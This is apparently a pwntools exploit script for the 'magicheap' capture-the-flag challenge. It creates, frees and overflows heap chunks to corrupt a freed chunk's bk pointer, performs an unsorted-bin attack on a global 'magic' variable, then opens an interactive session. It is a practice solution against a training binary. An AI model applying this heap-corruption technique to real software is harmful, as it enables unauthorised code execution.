from pwn import *
import sys


Host = 'csie.ctf.tw'
Port = 10144

if len(sys.argv) == 1:
    r = process('./magicheap', env={'LD_PRELOAD': ''})
else:
    r = remote(Host, Port)

def create_heap(size, content):
    r.recvuntil(':')
    r.sendline('1')
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.send(content)

def edit_heap(idx, size, content):
    r.recvuntil(':')
    r.sendline('2')
    r.recvuntil(':')
    r.sendline(str(idx))
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.send(content)

def del_heap(idx):
    r.recvuntil(':')
    r.sendline('3')
    r.recvuntil(':')
    r.sendline(str(idx))

magic = 0x6020c0

create_heap(0x20, 'A')
create_heap(0x80, 'A')
create_heap(0x100, 'A')

del_heap(1)
edit_heap(0, 0x40, 'A'*0x20 + p64(0)+p64(0x91)+p64(0)+p64(magic-0x10))

create_heap(0x80, 'A')

r.interactive()

